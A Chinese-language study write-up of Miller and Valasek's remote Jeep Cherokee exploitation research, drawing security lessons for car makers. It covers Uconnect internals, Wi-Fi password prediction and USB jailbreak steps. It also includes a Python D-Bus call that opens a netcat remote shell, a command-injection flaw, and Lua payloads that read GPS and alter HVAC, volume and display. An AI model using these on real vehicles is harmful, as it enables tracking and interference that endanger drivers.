
## 报告内容概要

Miller 等人选择 2014款 Jeep Cherokee 作为研究对象的原因，是这款车恰好被作者发现且能充分证明远程网络攻击能够窃取驾驶员隐私并且实现远程控车。在《Remote Exploitation of an Unaltered Passenger Vehicle》报告中，其主要内容包括：

- 2014款Jeep Cherokee 的技术分析
  - 网络架构
  - 网络物理特性
    - 自适应巡航控制（ACC）
    - 前向碰撞告警增强（FCW+）
    - 车道偏离告警（LDW+）
    - 泊车辅助系统（PAM）
  - 远程攻击面
    - 被动防盗窃系统（PATS）
    - 胎压监测系统（TPMS）
    - 远程无钥匙进入/启动（RKE）
    - 蓝牙
    - Radio 数据系统
    - WiFi
    - 车载信息系统/Internet/Apps
- Uconnect System
  - QNX 环境
  - 文件系统和服务
    - IFS
    - ETFS
    - MMC
    - PPS
  - WiFi
    - 加密
    - 开放端口
  - D-Bus 服务
  - 蜂窝通信模块
  - CAN 连接性
- Uconnect 越狱
  - 任意版本
  - 更新模式
  - 正常模式
- 渗透 D-Bus 服务
  - 代码执行
- Uconnect 攻击载荷
  - GPS
  - HVAC
  - Radio Volume
  - Bass
  - Radio Station（FM）
  - Display
  - Knobs
- 蜂窝通信模块渗透
  - 网络设置
  - Femtocell
  - 蜂窝通信访问
- 有漏洞车辆的扫描
  - 扫描结果
  - 有漏洞车辆数量预测
  - 车辆蠕虫
- V850
- SPI 通信
- 完整渗透链
  - 识别目标
  - 渗透车机的OMAP芯片
  - 控制 Uconnect 系统
  - v850固件刷写
  - 执行网络物理功能
- 网络物理内部结构
- 网络物理 CAN 消息
  - 正常 CAN 消息
  - 诊断 CAN 消息
- 信息披露
- 补丁和风险缓解
- 结论

虽然这是一份2015年公布的报告，但这份报告，内容丰富，层次分明，个人认为是一份不错的进入汽车网络安全领域的入门手册。

## 攻击面分析

网络攻击是利用系统漏洞，破坏目标网络信息系统机密性、完整性、可用性的过程。网络攻击开始于对目标的信息搜集和攻击入口寻找。面向汽车的网络攻击也不例外，在 Miller 等人的研究中，首先分析了车机的网络连接和功能特性，由此来寻找可利用的网络攻击入口。对车机攻击入口进行枚举、分类及关联，就构成了面向车机系统的网络攻击面（Attack Surface）。

### 车机网络连接分析
2014款 Jeep Cherokee车型网络架构当时没有考虑网络安全问题，将车机（Head Unit/Radio）与CAN总线直接相连。基本组成如下图所示：

<img src="images/2014款jeepcherokee内部拓扑.png">

Miller等人认为如果车机能成功渗透，那么就可以访问连接在CAN-IHS和CAN-C网络上的大量ECUs，这意味着恶意CAN消息可以发送到所有车辆控制物理功能的ECUs上。事实上，之后的远程渗透过程也是沿着这个思路进行的。这里我们得到了第一条启示：**不要将车载信息娱乐系统（车机、IVI、T-Box）等连接外网的设备与车内总线直接相连，如果必须相连，则需要经过充分的网络安全隔离。**

2014款 Jeep Cheerokee 配备了为数不少的辅助驾驶功能，这些功能一方面为驾乘人员和车外环境提供了更多的安全保障，但另一方面也增加了网络入侵的可能。这些功能包括：自动巡航控制ACC、前向碰撞告警（FCW+）、道路偏离告警（LDW+）、泊车辅助系统PAM等等。这些系统中，Miller等人充分利用了PAM系统来实现了远程控车操作。

### 攻击面分析

对于网络攻击者而言，分析网络架构和车辆功能是为了找到可实施攻击的入口，即寻找攻击面，特别是可远程的攻击面。总的来看，潜在的攻击入口有6个：

|攻击入口|连接的ECU|连接总线|
|-|-|-|
|远程无钥匙进入/启动系统RKE|车机（Radio）频率控制模块RFHM|CAN-C|
|被动防盗系统 PATS|车机（Radio）频率控制模块RFHM|CAN-C|
|胎压监测系统TPMS|车机（Radio）频率控制模块RFHM|CAN-C|
|蓝牙系统Bluetooth|车机（Radio）|CAN-C，CAN-IHS|
|FM/AM/XM|车机（Radio）|CAN-C，CAN-IHS|
|蜂窝通信Cellular|车机（Radio）|CAN-C，CAN-IHS|
|Internet / APPs|车机（Radio）|CAN-C，CAN-IHS|

就上面列表中的内容，简要说明如下：

1.RKE和PATS是最先会被考虑的攻击入口，因为一旦发现并利用 RKE 或 PATS 的漏洞，就能够证明非法进入车辆和点火启动是成立的。下图给出了 RKE 类似系统的组成。
> 注：RKE 在有些资料中，称为无钥匙进入系统和无钥匙进入系统（Keyless Entry Start & Exit Security System，Kessy），也有OEM称之为被动进入和被动启动系统（Passive Entry & Passive Start，PEPS）。

<img src="images/kessy.png">

图3 - 无钥匙进入系统的基本结构

2.2014款 Jeep Cheerokee 的远程无钥匙进入系统 RKE（钥匙）里有一短距离无线发射器能够与车内的ECU——Raido 频率HUB模块（RFHM）进行通信。当钥匙发送包含了正确识别码的信息，RFHM 若判断该钥匙有效，会随后完成锁闭、解锁和启动车辆等操作。RFHM的固件（Firmware）程序负责 RF 信号处理、加解密识别码、识别遥控钥匙发送的数据，还能为备用钥匙编程。Jeep的被动防盗系统 PATS 使用了一块放在启动钥匙中的芯片与车内传感器通信，而这一传感器直接连接着 Raido 频率 HUB 模块（RFHM）。当启动按钮按下时，车载计算机会发生一个射频信号，钥匙内的应答器采集到这一信号后会返回一个唯一的RF信号给车载计算机。之后，车载计算机会确认启动并持续运行。这个过程少于1秒，如果车载计算机没有接收到正确的识别码，某些部件（例如燃油泵和某些部件上的起动机）将保持禁用状态。虽然存在发现 RFHM 固件漏洞及利用方法存在可能，但其远程实施攻击的可能性不大，因为必须非常接近车辆才能与车内传感器进行通信。

3.胎压监测系统 TPMS 也是一个常被考虑的攻击入口。TPMS的基本结构如下图4所示。Cheerokee 的每条轮胎都装有压力传感器，使用短距离无线通信方式实时传递数据给 RFHM 中的信号接收传感器。在一些安全研究中TPMS确实可能被攻击者通过无线信号注入方式产生干扰或影响功能，甚至可以证明TPMS以不安全方式处理接收到的数据，但通过TPMS形成代码注入和执行的可能性较小。


<img src="images/tpms.png">

图4 - TPMS系统的基本结构

4.车载蓝牙系统是值得关注的一个攻击入口，从近年来美国 NIST 的国家漏洞库 NVD 可知，与蓝牙相关的漏洞有583个（截止2022年5月10日），其中不乏可远程利用的高危漏洞。2014款 Jeep Cheerokee 的蓝牙系统集成在车机系统中，蓝牙配对成功后可执行访问车机中的通信录、拨打电话、听音乐、发送短信等操作。

5.2014款 Jeep Cheerokee 的 Radio 数据系统衔接着GPS、AM/FM Radio、卫星Radio等远程输入，还具有通过FM模拟信号或卫星信号向外发送数据的功能，因此它的 Radio 数据系统也被考虑为一个攻击入口。

6.基于蜂窝通信的互联网接入模块不仅连通了互联网，也将作为一个WiFi热点为车内乘客提供服务，所以Jeep上的蜂窝通信和WiFi热点也都被列为重要的攻击入口。由于 2014款 Jeep Cherokee 的WiFi热点必须付费后才能开通使用，所以利用 WiFi 热点漏洞是存在付费这一条件的。默认的 WiFi 加密方式为带8位字符+数字的随机密钥的 WPA2 算法，这一点是比较安全。

7.车载信息娱乐系统（Telematic）及其中应用既可连接互联网且常见于包含可利用漏洞，是值得关注的一大攻击入口，而暴露出严重问题的 Uconnect 系统也证实了这一点。

从攻击面分析来看，我们可以得到第二条启示：**尽量避免使用无线通信，如果必须使用，那么要充分降低通信距离、时间，避免使用有公开漏洞的软硬件，关于蓝牙、WiFi等频繁爆发高危漏洞的模块需要执行长期监控。**

### Uconnect 系统

Uconnect 系统是一款功能不俗的车机系统。2014款 Jeep Cheerokee 装配的为Uconnect 8.4AN/RA4，由 Harman Kardon 制造，提供车载娱乐、WiFi连接、导航、应用软件和蜂窝通信功能。

<img src="images/jeep uconnect系统.png">

主要功能芯片为同档次车型中较为常见的 TI OMAP-DM3730 芯片，这是一种基于ARM Cortex-A8的32位单核数字媒体处理芯片，支持以太网，OS为Linux 或 RTOS（Jeep选用了QNX）。Uconnect 通过CAN-IHS总线与其他ECUs通信，在一些装配了 Uconnect Acess组件的车辆里，也会使用CAN-C总线与ECUs通信。

<img src="images/TI-DM3730结构图.png">

图6 TI OMAP-DM3730 芯片结构示意图

Harman 公司产的 Uconnect系统在 Fiat Chrysler 公司其他车型上也颇为常见，例如：Chrysle、Dodge、Jeep、Ram等等。由于 Uconnect 中存在漏洞，所以引发了后来 Fiat Chrysler 公司的大范围召回。从这里，我们可以得到第三条启示：**应特别关注关键车载网联零部件的网络安全问题，防止发生大的供应链安全风险**

## QNX
2014款 Jeep Cheerokee 的 Uconnect 系统采用了 QNX 作为底层OS。使用处理器信息查看命令`pidin`：

```sh
# pidin info
CPU:ARM Release:6.5.0 FreeMem:91Mb/512Mb BootTime:Jul 30 21:45:38 2014
Processes: 107, Threads: 739
Processor1: 1094697090 Cortex A8 800MHz FPU 
```

>注：有关 QNX 系统的安全分析和应用分析可以在虚拟机上实现。

### 文件系统和服务

Uconnect 中的文件存放在 NAND Flash 中。出于不同的目的，Flash上有多个文件系统，如下表所示：

|分区名|权限|功能|
|-|-|-|
|初始化程序加载 IPL| 只读|LPL 分区包含了启动Uconnet的 Bootloader。|
| IFS |只读| IFS 分区包含了 QNX 文件系统镜像，它包含了OS所有二进制和配置文件，将在启动时被加载到RAM中。|
|ETFS|读写|ETFS是嵌入式事务文件系统，用于嵌入式固态存储设备，高可靠，支持POSIX 语义的全层级目录结构|
|MMC|读写|多媒体卡分区挂载于/fs/mmc0，用于存储系统数据，是Uconnect中唯一的大容量可写存储器|

在这几个分区中，IPL 的安全显然非常重要。Bootloader一旦被篡改，那么将形成 rootkit，任何恶意程序都可无声无息的被运行，但实现难度也是显然的，即攻击者必须物理接入车机主控芯片进行操作。IFS 的安全也很重要，它存放了所有运行 QNX 系统的二进制文件和配置信息。特别是它还与软件更新相关，通过查看车机中未打包的 ISO 文件，在主目录下可以找到 ‘manifest’ 清单文件。其中部分内容揭示了 IFS 的位置是文件 “ifs-cmc.bin” 。还可以在QNX中找到 `swdl/usr/share/swdl.bin` 这个包含升级过程的镜像文件。为了查看这个镜像中的内容，可以使用 `memifs2` 和 `dumpifs` 命令，例如：

```sh
memifs2 -q -d /fs/usb0/usr/share/swdl.bin /somewritable

dumpifs /fs/usb0/usr/share/swdl.bin

Offset Size Name
 0 8 *.boot
 8 100 Startup-header flags1=0x9 flags2=0 paddr_bias=0
 108 22008 startup.*
 22110 5c Image-header mountpoint=/
 2216c cdc Image-directory
 ---- ---- Root-dirent
 23000 8a000 proc/boot/procnto-instr
 ad000 325c proc/boot/.script
 ---- 3 bin/sh -> ksh
 ---- 9 dev/console -> /dev/ser3
 ---- a tmp -> /dev/shmem
 ---- 10 usr/var -> /fs/etfs/usr/var
 ---- 16 HBpersistence -> /fs/etfs/usr/var/trace
 ---- a var/run -> /dev/shmem
 ---- a var/lock -> /dev/shmem
 ---- a var/log/ppp -> /dev/shmem
 ---- 15 opt/sys/bin/pppd -> /fs/mmc0/app/bin/pppd
 ---- 15 opt/sys/bin/chat -> /fs/mmc0/app/bin/chat
 ---- 18 bin/netstat -> /fs/mmc0/app/bin/netstat
 ---- 16 etc/resolv.conf -> /dev/shmem/resolv.conf
 ---- 16 etc/ppp/resolv.conf -> /dev/shmem/resolv.conf
 ---- 18 etc/tuner -> /fs/mmc0/app/share/tuner
 ---- 8 var/override -> /fs/etfs
 ---- c usr/local -> /fs/mmc0/app
 ---- b usr/share/eq -> /fs/mmc0/eq
 b1000 12af etc/system/config/fram.conf
 b3000 38c etc/system/config/nand_partition.txt
 b4000 56b etc/system/config/gpio.conf
 b5000 247b bin/cat
 b8000 1fed bin/io
 ba000 2545 bin/nice
 bd000 216a bin/echo
 c0000 38e0f bin/ksh
 f9000 41bb bin/slogger
 fe000 60a1 bin/waitfor
 105000 531b bin/pipe
 10b000 5e02 bin/dev-gpio
 120000 1270b bin/dev-ipc
 140000 1f675 bin/io-usb
 160000 29eb bin/resource_seed
 163000 3888 bin/spi-master
 167000 48a0 bin/dev-memory
 16c000 9eab bin/dev-mmap
 176000 602c bin/i2c-omap35xx
 17d000 da08 bin/devb-mmcsd-omap3730teb
 18b000 dd3 bin/dev-ipc.sh
 18c000 2198 bin/mmc.sh
 190000 1208f bin/devc-seromap
 1a3000 323d bin/rm
 1a7000 ffa2 bin/devc-pty
 1b7000 4eb bin/startSplashApp
 1b8000 692 bin/startBackLightApp
 1b9000 1019 bin/mmc_chk
 1bb000 42fe usr/bin/adjustImageState
 1c0000 12c81 usr/bin/memifs2
 1d3000 284 usr/bin/loadsecondaryifs.sh
 1e0000 77000 lib/libc.so.3
 ---- 9 lib/libc.so -> libc.so.3
 260000 b0e4 lib/dll/devu-omap3530-mg.so
 26c000 9d17 lib/dll/devu-ehci-omap3.so
 276000 4705 lib/dll/spi-omap3530.so
 280000 14700 lib/dll/fs-qnx6.so
 295000 36e6 lib/dll/cam-disk.so
 2a0000 2b7ba lib/dll/io-blk.so
 2d0000 5594f lib/dll/charset.so
23
 330000 1243c lib/dll/libcam.so.2
 ---- b lib/dll/libcam.so -> libcam.so.2
 350000 3886 lib/dll/fram-i2c.so
Checksums: image=0x702592f4 startup=0xc11b20c0
```

ETFS 中没有对特别有价值的内容，所以这里不再赘述。但是 MMC 文件系统是非常值得关注的，因为它以读写方式被挂载，意味着可以在上面写脚本或代码并执行它。例如在上面发现了诸如“sshd”、“boot.sh"和“runafterupdate.sh”等脚本，还有安装脚本“mmc.lua", 是从ISO镜像中拷贝 `/usr/share/MMC_IFS_EXTENSION` 到 “/fs/mmc0/app”。

QNX 中运行了一些有分析价值的服务，其中一个比较重要的是 PPS（Persistent Publish/Subscribe Service），它有几个相关文件比较重要：

```
/pps/can/vehctl
/pps/can/tester
/pps/can/can_c
/pps/can/send
/pps/can/comfortctl
```

这些文件主要用于PPS服务写入数据，作为输入供其他进程读取。例如，下列数据会被存放在一个 PPS 文件中：

```
@gps
city::Ottawa
speed:n:65.412
position:json:{"latitude":45.6512,"longitude":-75.9041}
```

为了提取这段数据，会使用类似代码：

```c
const char *city;
double lat, lon, speed;
pps_decoder_t decoder;

pps_decoder_initialize(&decoder, NULL);
pps_decoder_parse_pps_str(&decoder, buffer);
pps_decoder_push(&decoder, NULL);
pps_decoder_get_double(&decoder, "speed", &speed);
pps_decoder_get_string(&decoder, "city", &city);

pps_decoder_push(&decoder, "position");
pps_decoder_get_double(&decoder, "latitude", &lat);
pps_decoder_get_double(&decoder, "longitude", &lon);
pps_decoder_pop(&decoder);

pps_decoder_pop(&decoder);

if ( pps_decoder_status(&decoder, false) == PPS_DECODER_OK ) {
 . . .
}
pps_decoder_cleanup(&decoder);
```

在一个台工作中的Uconnect 系统中可以看到下列信息：
```sh
# cat send

[n]@send
DR_MM_Lat::1528099482
DR_MM_Long::1073751823
GPS_Lat::1528099482
GPS_Long::1073751823
HU_CMP::0
NAVPrsnt::1
RADIO_W_GYRO::1
```

进一步分析，可以看到在一个名为 `can_c` 的子目录中有PPS文件，但是写这些文件不能产生 CAN 消息，这一点可以通过 CAN Sniffer 工具验证。换句话说，PPS并不发送CAN消息，但是揭示了一些通信方式信息。Miller 等人原本希望能够使用 PPS 文件发送篡改的 CAN 消息，但没有成功。Miller 认为这可能是因为他们没有正确理解和运用PPS。

QNX 中有一个负责产生 WiFi 随机密码的二进制文件"WifiSvc"，逆向该文件后能找到相关实现函数 `WiFi.E:generateRandomAsciiKey()`，其构成如下：

```c
int convert_byte_to_ascii_letter(signed int c_val)
{
  char v3; // r4@2
  if ( c_val > 9 )
  {
    if ( c_val > 35 )
      v3 = c_val + 61;
    else
      v3 = c_val + 55;
  }
  else
  {
    v3 = c_val + 48;
  }
  return v3;
}
char *get_password(){
  int c_max = 12;
  int c_min = 8;
  unsigned int t = time(NULL);
  srand (t);
  unsigned int len = (rand() % (c_max - c_min + 1)) + c_min;
  char *password = malloc(len);
  int v9 = 0;

  do{
    unsigned int v10 = rand();
    int v11 = convert_byte_to_ascii_letter(v10 % 62);
    password[v9] = v11;
    v9++;
  } while (len > v9);

  return password;
```

如果有C语言基础，应该可以看出上面的随机密码是在一个系统时间 t （单位为s）的基础上做了一些运算后得到的。如果 t 是随机性的，那么预测随机密码将成为难题。但是后来 Miller 等人发现这个 t 是车机头一次启动的时间，所以可以根据这个知识构造出一个密码列表（wordlist）来穷举WiFi热点的 WPA2 加密连接。攻击可以根据车的生产日期来猜测车机的第一次启动时间，进而构造这个 wordlist。如果我们可以正确估计一台车其车机第一次启动的月份，那么这个wordlist 会有 1千5百万个密码，而第一启动车机也通常不会在夜晚，所以可以去掉一半选项。此外，一些研究表明可以 133,000 次/秒的速度执行离线测试，这意味着2分钟内就可完成破解。

当车机第一次启动时，事实上需要首先接收来自GPS或蜂窝网络的授时信号才能确定系统时间，QNX 中的文件"clock.lua"负责设置系统时间，它的函数 start() 代码如下：

```lua
local rtcTime = getV850RealtimeClock()
local rtcValid = false

if rtcTime == nil or rtcTime.year == 65535 or rtcTime.month == 255 or rtcTime.day == 255 or rtcTime.hour == 255 or rtcTime.mi n == 255 or rtcTime.sec == 255 then
    dbg.print("Clock: start -- V850 time not received or is set to factory defaults")
...
if rtcValid == false then
  dbg.print("Clock: start -- Unable to create the UTC time from V850")
  setProperty("timeFormat24", false)
  setProperty("enableClock", true)
  setProperty("gpsTime", true)
  setProperty("manualUtcOffset", 0)
  defTime = {}
  defTime.year = 2013
  defTime.month = 1
  defTime.day = 1
  defTime.hour = 0
  defTime.min = 0
  defTime.sec = 0
  defTime.isdst = false
  setSystemUTCTime(os.time(defTime))
  timeFormatOverride = false
  enableClockOverride = false
end
```

这段代码时Lua语言描述的，如果车机不能得到时间，它将把系统时间设置为 00:00:00 Jan 1，2013 GMT。那么WiFi的随机密码会不会以此时间为时间变量 t的值呢？从 Miller 等人的观察来看，答案是否定的。经过分析，他们的随机密码为 "TtYMxfPhZxkp" 如果使用穷举分析可知对应的系统时间 t = 0x50e22720，即 00:00:32 Jan 1，2013 GMT。这意味着 WifiSvc 生成密码的时间比 clock.lua 的启动时间晚32秒。这仍然是一个大发现，将 wordlist 的长度缩短为几十个，爆破WiFi密码几乎会在瞬间完成。

对WiFi热点更为常见的访问方法是对默认网关进行端口扫描，检查是否有开放端口。2014款 Jeep Cheerokee 车机的开放端口不止一个：

```sh
$ netstat -n | grep LISTEN

tcp 0 0 *.6010 *.* LISTEN  # Wicome
tcp 0 0 *.2011 *.* LISTEN  # NATP
tcp 0 0 *.6020 *.* LISTEN  # SASService，实现语音API的服务端
tcp 0 0 *.2021 *.* LISTEN  # MonitorService 从runtime 提交 debug/trace 信息到文件或TCP/IP；通过TCP/IP，提供发送GCF消息给SCP系统
tcp 0 0 127.0.0.1.3128 *.* LISTEN # 3proxy 代理服务
tcp 0 0 *.51500 *.* LISTEN  # 3proxy admin web server
tcp 0 0 *.65200 *.* LISTEN  # dev-mv2trace
tcp 0 0 *.4400 *.* LISTEN  # HmiGateway
tcp 0 0 *.6667 *.* LISTEN  # D-Bus session bus
```

这些端口对应的服务大多是专用的，很可能存在漏洞，很有可能成为攻击入口。经 Miller 等人分析，最有价值的大致是 6667 端口。通常这个端口被 IRC 所保留。使用 telnet 连接到6667端口并敲几个回车，发现响应不对，这个服务不是IRC服务器，而是基于IP的D-Bus会话服务。它是一种进程间通信和进程间远程过程调用机制。

```sh
$ telnet 192.168.5.1 6667
Trying 192.168.5.1...
Connected to 192.168.5.1.
Escape character is '^]'.
a
ERROR "Unknown command"
```


D-Bus 会话服务的交互机制如下图所示：
<img src="images/D-Bus交互机制示意图.png">

对于D-Bus，总的来看仅有两条总线值得关注：系统总线和会话总线。系统总线负责D-Bus后台进程和系统服务注册；会话总线由用户应用保留（自定义）。D-Bus可能要求认证，在Jeep的车机里，认证向匿名活动开放，如下所示：

```sh
telnet 192.168.5.1 6667
Trying 192.168.5.1...
Connected to 192.168.5.1.
Escape character is '^]'.
AUTH ANONYMOUS
OK 4943a53752f52f82a9ea4e6e00000001
BEGIN
```

Miller 等人利用 Python D-Bus 库写了几个脚本与 D-Bus系统进行交互，但是最有价值的工具是 DFeet。下面的截图显示了使用DFeet查找 “com.harman.service.SoftwareUpdate” 服务。

<img src="images/DFeet output for com.harman.service.SoftwareUpdate.png">

DFeet 可以显示大量的服务信息（也被称为总线名），例如：
- com.alcas.xlet.manager.AMS
- com.harman.service.AppManager
- com.harman.service.AudioCtrlSvc

每个服务都有一个对象路径，例如：“com.harman.service.onOff” 有路径
“/com/harman/service/onOff”。 此外，每个服务有两个接口：“com.harman.Serviceipc“ 和 ”org.freedesktop.DBus.Introspectable” 。Serviceipc 接口仅有一个方法，它接收一个字符串参数并返回一个代表通用D-Bus接口的字符串。这些接口可以从DFeet进行调用，例如你可以点击 ‘com.harman.service.Control’，然后点击 ‘/com/harman/service/Control’ ，再点击 ‘Invoke’ under ‘Serviceipc’, 最终填入参数 “getServices”,执行得到下列内容：

<img src="images/Invoking via DFeet.png">

检查和分类所有的 D-Bus服务和方法，可以发现几个直接与车机交互的服务，例如：
- 调节radio音量
- 访问 PPS 数据
- 其他低层级访问


2014款 Jeep Cherokee 中使用的 Harman Uconnect 系统有蜂窝通信（Cellular）功能，可以使用 Sprint's cellular 网络通信。这个系统也被称为车载信息系统（Telematics）。Telematics 是车载 WiFi、实时升级和许多其他远程连接的基础。在这里，实现蜂窝通信的是一块 Sierra Wireless AirPrime AR5550，如下图所示：

<img src="images/Sierra Wireless AirPrime AR5550.png">

从标记上看，Sierra Wireless AirPrime AR5550 使用了 高通（Qualcomm）的 3G 基带芯片和 Sprint 载波。使用 Sierra Wireless Software Development Kit 可以开发和调试这个系统。


在对内通信方面，Harman Uconnect 系统所用的 TI OMAP-DM3730 不能与 CAN 总线直接通信，所以2014款 Jeep Cherokee 中使用另一块芯片 Renesas V850 FJ3 负责 CAN 总线接入和处理，如下图所示：

<img src="images/renesas-v850.png">

Renesas V850 FJ3 在2014年前后的美国车机市场上非常常见，它是一款低功耗、可用于持续监测CAN通信数据的芯片，必要时由 OMAP-DM3730 用高电压芯片唤醒。在 IDA Pro 中已经包含了 ARM 架构处理器特性，方便了对 V850 固件的逆向分析。

## 车机越狱（JailBreaking）

为了进一步弄清 UConnect 系统的内部结构并探索横向扩展的方法，需要对 UConnect 进行越狱。主要有两种方法：一种简单通用，另一种面向特定版本的OS。

方法一：（1）将含有有效升级ISO文件的 USB 设备插入 UConnect 系统的USB接口；（2）车机验证 USB 设备中升级镜像后，会提示准备开始升级；（3）在通过验证后且 UConnect 重启前，拔掉 USB 设备，UConnect 会放弃升级并重启进入正常模式（非升级），这时关闭电源，系统会并提示你“Please insert update USB”。（3）此时插入一个包含篡改后ISO文件的新 USB 设备，UConnect 表现出不再重新验证 ISO 的完整性，而是直接使用篡改后的ISO文件。可以通过这个办法修改 UConnect 的 root 默认密码等配置。

方法二：方法二面向 14-05-03 版本，这个版本中存在一个绕过ISO完整性验证过程的漏洞。验证过程文件为 "/usr/share/scripts/update/installer/system_module_check.lua" ，用Hex编辑器修改升级ISO文件中的某个字节即可使完整性校验失效。


如果希望在升级过程中运行一些代码，执行一些别的操作，可以修改 "system_module_check.lua" 文件。最有效的绕过某个步骤的方法就是修改 ISO 文件并检查是否绕过了完整性检查，如果确实绕过了那么就不必对完整升级过程进行分析，仅需要30分钟左右就可以使自己的代码生效。此外，可以通过修改 “cmds.sh” 使完整升级过程中止。经 Miller 等人的尝试，“升级模式”下仅部分文件和功能可挂载和使用，如网络连接等功能不能启用，但也证明了车机重启后所修改的内容可持续发生作用，为后续漏洞利用提供了方法和支撑。“正常模式”下，可以访问所有文件系统，包括网络连接，篡改植入的代码可以修改 “boot.sh" 文件，使篡改后代码可在“正常模式”下运行。通过篡改，可以达到执行任意代码的效果，例如把“修改root口令、开启/fs/mmc0/app/bin/sshd”等待执行代码写入USB设备中的“cmds.sh”, Uconnect若在启动时检测到它，就会加载执行。效果如下所示：

```sh
ssh root@192.168.5.1
******************************** CMC ********************************
Warning - You are knowingly accessing a secured system. That means
you are liable for any mischeif you do.
*********************************************************************
root@192.168.5.1's password:
```

通常，攻击者希望将文件传到 Uconnect 系统中，这可以使用 `mount -uw /fs/mmc0/` 命令，以读写方式挂载 mmc0 分区。


## 渗透 D-Bus 服务

D-Bus 系统可以匿名访问并且用于进程间通信，所以寻找其中漏洞并利用它是自然又重要的，这种弱防护的复杂服务最有可能含有代码注入、越权、信息泄露、内存冲突等风险。通过进一步分析，Miller 等人发现了一个重要的 D-Bus 服务 “NavTrailService”，它的代码实现在 “/service/platform/nav/navTrailService.lua” 中。这是一个Lua脚本，所以寻找命令注入类漏洞是首选，Miller 等人也确实发现了一些可疑点：

```lua
function methods.rmTrack(params, context)
 return {
  result = os.execute("rm \"" .. trail_path_saved .. params.filename .. "\"")
 }
end
```

这里的“rmTrack”方法存在一个命令注入漏洞，允许攻击者通过指定一个文件名，来调用D-Bus方法运行任意的shell命令。类似的情况还在其他函数中可以看到，特别是处理用户交互的一些功能中。但是，命令注入其实没有必要，因为 “NavTrailService” 服务提供了一个 “execute” 方法用来执行任意shell命令，这是系统预留的一个功能而不是漏洞，下面是“NavTrailService” 服务中所有可用的方法：

```
"com.harman.service.NavTrailService":
{"name":"com.harman.service.NavTrailService",
"methods":{"symlinkattributes":"symlinkattributes","getProperties":"getPr
operties","execute":"execute","unlock":"unlock","navExport":"navExport","ls":"ls","attributes":"attributes","lock":"lock","mvTrack":"mvTrack","getTracksFolder":"getTracksFolder","chdir":"chdir","rmdir":"rmdir","getAllProperties":"getAllProperties","touch":"touch","rm":"rm","dir":"dir","writeFiles":"writeFiles","setmode":"setmode","mkUserTracksFolder":"mkUserTracksFolder","navGetImportable":"navGetImportable","navGetUniqueFilename":"navGetUniqueFilename","mkd
ir":"mkdir","ls_userTracks":"ls_userTracks","currentdir":"currentdir","rmTrack":"rmTrack","cp":"cp","setProperties":"setProperties","verifyJSON":"verifyJS
ON"}},
```

可以看出，在车机上以 root 身份执行命令是比较容易的，特别是车机上默认安装了很多常见的通信工具，例如 netcat。下面4行Python代码是开启一个远程shell的示例：

```python
#!python
import dbus

bus_obj=dbus.bus.BusConnection("tcp:host=192.168.5.1,port=6667")
proxy_object=bus_obj.get_object('com.harman.service.NavTrailService','/com/harman/service/NavTrailService')
playerengine_iface=dbus.Interface(proxy_object,dbus_interface='com.harman.ServiceIpc')
print playerengine_iface.Invoke('execute','{"cmd":"netcat -l -p 6666 | /bin/sh | netcat 192.168.5.109 6666"}')
```

## Uconnect 攻击载荷

Miller 等人发现了在Uconnect中很多 LUA 脚本可用于影响车辆内部和通信功能，例如调高音量或阻止某个控制功能起作用。这些脚本提供了一个命令集，一旦攻击者可以远程接入系统，那么相关车辆功能都有可能受其影响。

车机有查询和获取GPS位置的功能，相关数据也可以通过未授权的 D-Bus 通信从端口6667得到。例如相关脚本如下：

```lua
service = require("service")
gps = "com.harman.service.NDR"
gpsMethod = "JSON_GetProperties"
gpsParams = {
 inprop = {
 "SEN_GPSInfo"
 }
}
response = service.invoke(gps, gpsMethod, gpsParams)
print(response.outprop.SEN_GPSInfo.latitude, response.outprop.SEN_GPSInfo.longitude) 
```

执行该脚本得到GPS信息：
```sh
$ lua getGPS.lua
40910512 -73184840
```

在某些地图软件，例如 Google Map中输入这个数值 40.910512 -73.184840，可以发现目标车辆的位置为 Long Island。

车机还可以控制车辆供暖和空调，下面代码是设置风扇为任意速度的示例：

```lua
require "service"
params = {}
control = {}
params.zone = "front"
control.fan = arg[1]
params.controls = control
x=service.invoke("com.harman.service.HVAC", "setControlProperties", params)
```

车机还有一大功能是控制Radio，这一点也是可以远程实现控制的。例如攻击者知道某首歌曲正在播放，他可以使用下列脚本突然调高音量：

```lua
require "service"
params = {}
params.volume = tonumber(arg[1])
x=service.invoke("com.harman.service.AudioSettings", "setVolume", params)
```

还可以通过脚本设定FM电台：
```lua
require "service"
Tuner = "com.harman.service.Tuner"
service.invoke(Tuner, "setFrequency", {frequency = 94700})
```
或是通过脚本改变当前车机屏幕的显示：
```lua
require "service"
x=service.invoke("com.harman.service.LayerManager", "viewBlackScreen", {})
x=service.invoke("com.harman.service.LayerManager", "stopBlackScreen", {})
x=service.invoke("com.harman.service.LayerManager", "viewCameraInput", {})
x=service.invoke("com.harman.service.LayerManager", "stopViewInput", {})
x=service.invoke("com.harman.service.LayerManager", "showSplash", {timeout =2})
```

或是改变屏幕显示的图片，图片格式应为png格式：
```sh
mount -uw /fs/mmc0/
cp pic.png /fs/mmc0/app/share/splash/Jeep.png
pidin arg | grep splash
kill <PID>
splash -c /etc/splash.conf &
```

通过关闭“service.lua” 进程，可以使车机上的物理按钮失效：
`kill this process: lua -s -b -d /usr/bin service.lua`


### 蜂窝通信模块渗透

上面分析了如何利用USB进行越狱和如何利用D-Bus服务及其漏洞等两种方法实现任意代码执行，但仍然停留在物理接触车辆的攻击场景内，没有实现远程代码执行（RCE）。虽然接入 WiFi 热点并实现对车辆渗透是令人兴奋的，这也说明了可以远程实现命令执行，但很多人不会每月付费 $34.99 来开启车内WiFi模块且 WiFi 通信距离在百米之内，远程执行的限制较大。为了能够真正实现远程渗透攻击，Miller 等人研究了更为实际的蜂窝通信模块。在 Uconnect 系统中查看网络配置：


```sh
$ ifconfig
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 33192
 inet 127.0.0.1 netmask 0xff000000
pflog0: flags=100<PROMISC> mtu 33192
uap0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
 address: 30:14:4a:ee:a6:f8
 media: <unknown type> autoselect
 inet 192.168.5.1 netmask 0xffffff00 broadcast 192.168.5.255
ppp0: flags=8051<UP,POINTOPOINT,RUNNING,MULTICAST> mtu 1472
 inet 21.28.103.144 -> 68.28.89.85 netmask 0xff000000
```

